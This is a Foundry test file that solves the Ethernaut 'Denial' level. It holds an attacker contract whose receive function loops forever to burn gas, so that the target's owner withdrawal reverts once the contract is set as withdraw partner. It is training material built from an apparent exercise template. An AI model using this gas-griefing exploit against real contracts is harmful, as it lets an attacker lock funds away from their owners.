// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Denial} from "../src/Denial.sol";

/// @dev Become the withdraw partner and consume gas so owner.transfer cannot run.
contract AttackDenial {
    // ========== YOUR RECEIVE / FALLBACK HERE ==========
    // Burn all gas forwarded by partner.call so little remains for owner.transfer.
    receive() external payable {
        while (true) {}
    }
    // ================================================
}

contract DenialTest is Test {
    Denial public target;
    AttackDenial public attackContract;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    uint256 constant INITIAL_BALANCE = 1 ether;

    function setUp() public {
        vm.deal(deployer, INITIAL_BALANCE);

        vm.startPrank(deployer);
        target = new Denial();
        (bool ok,) = address(target).call{value: INITIAL_BALANCE}("");
        require(ok);
        vm.stopPrank();

        vm.startPrank(attacker);
        attackContract = new AttackDenial();
        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition (Ethernaut):
        //   After you become partner, the level owner can no longer withdraw.
        //
        // Denial.withdraw():
        //   1. partner.call{value: amount}("")   // return value ignored
        //   2. payable(owner).transfer(amount)   // needs gas left
        //
        // If step 1 burns enough gas, step 2 fails and the tx reverts.
        //
        // Attack outline:
        //   1. target.setWithdrawPartner(address(attackContract))
        //   2. Simulate the owner trying to withdraw — it should revert
        //
        // Tip:
        //   target.setWithdrawPartner(address(attackContract));
        //   vm.expectRevert();
        //   target.withdraw();

        // ========== YOUR EXPLOIT HERE ==========
        vm.startPrank(attacker);
        target.setWithdrawPartner(address(attackContract));
        vm.stopPrank();

        // With unlimited gas, 1/64 remains after partner OOG and transfer can still
        // succeed. Ethernaut checks withdraw under a modest gas stipend (~1M).
        (bool success,) = address(target).call{gas: 1_000_000}(abi.encodeCall(Denial.withdraw, ()));
        assertFalse(success, "withdraw should fail when partner burns gas");
        // ========== END EXPLOIT ==========

        assertEq(target.partner(), address(attackContract), "attacker contract should be withdraw partner");
    }
}
